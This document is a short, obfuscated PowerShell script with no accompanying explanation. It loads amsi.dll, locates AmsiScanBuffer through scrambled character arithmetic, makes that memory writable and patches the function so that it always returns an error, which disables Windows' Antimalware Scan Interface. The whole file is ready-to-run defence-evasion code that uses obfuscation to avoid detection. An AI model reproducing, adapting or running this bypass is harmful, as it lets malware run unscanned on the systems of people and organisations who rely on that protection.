$lZ0 = @"
using System;
using System.Runtime.InteropServices;
public class lZ0 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr baQtC0W, string uFHvtWgI8T);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr KJTEey02B, UIntPtr HCboywsBCCFtECl, uint jGUDDFwoHCWV5s, out uint xZCaEGVBvJWFV0_);
}
"@

Add-Type $lZ0

$juCa3sfA2G = [lZ0]::LoadLibrary("$(('ä'+'m'+'s'+'ì'+'.'+'d'+'l'+'l').NorMALIze([ChAr]([bYTe]0x46)+[cHaR]([BYtE]0x6f)+[chAR](91+23)+[chAr]([byTE]0x6d)+[ChAr]([BytE]0x44)) -replace [CHar](92*39/39)+[chaR]([Byte]0x70)+[ChaR]([byTE]0x7b)+[ChAR](34+43)+[CHAR](110)+[ChAr]([byTE]0x7d))")
$ZTmtb58c8Pn = [lZ0]::GetProcAddress($juCa3sfA2G, "$([CHaR](54+11)+[cHAR](109*8/8)+[chAR](115+50-50)+[ChAR]([bYtE]0x69)+[CHAR](83+20-20)+[ChAr]([byTE]0x63)+[ChaR](97*72/72)+[chAr](16+94)+[chAR]([byTE]0x42)+[Char](75+42)+[char]([bYtE]0x66)+[ChAr](102+32-32)+[CHar](58+43)+[CHar]([byTe]0x72))")
$p = 0
[lZ0]::VirtualProtect($ZTmtb58c8Pn, [uint32]5, 0x40, [ref]$p)
$LTf39P2NmvspTKtK3 = "0xB8"
$xWGgccZB42x = "0x57"
$OnzHI_iT5 = "0x00"
$aiEGbfAd = "0x07"
$xZ_z2Jd = "0x80"
$j9vY2E35xW_tx = "0xC3"
$c65zmQ08Q4Q = [Byte[]] ($LTf39P2NmvspTKtK3,$xWGgccZB42x,$OnzHI_iT5,$aiEGbfAd,+$xZ_z2Jd,+$j9vY2E35xW_tx)
[System.Runtime.InteropServices.Marshal]::Copy($c65zmQ08Q4Q, 0, $ZTmtb58c8Pn, 6)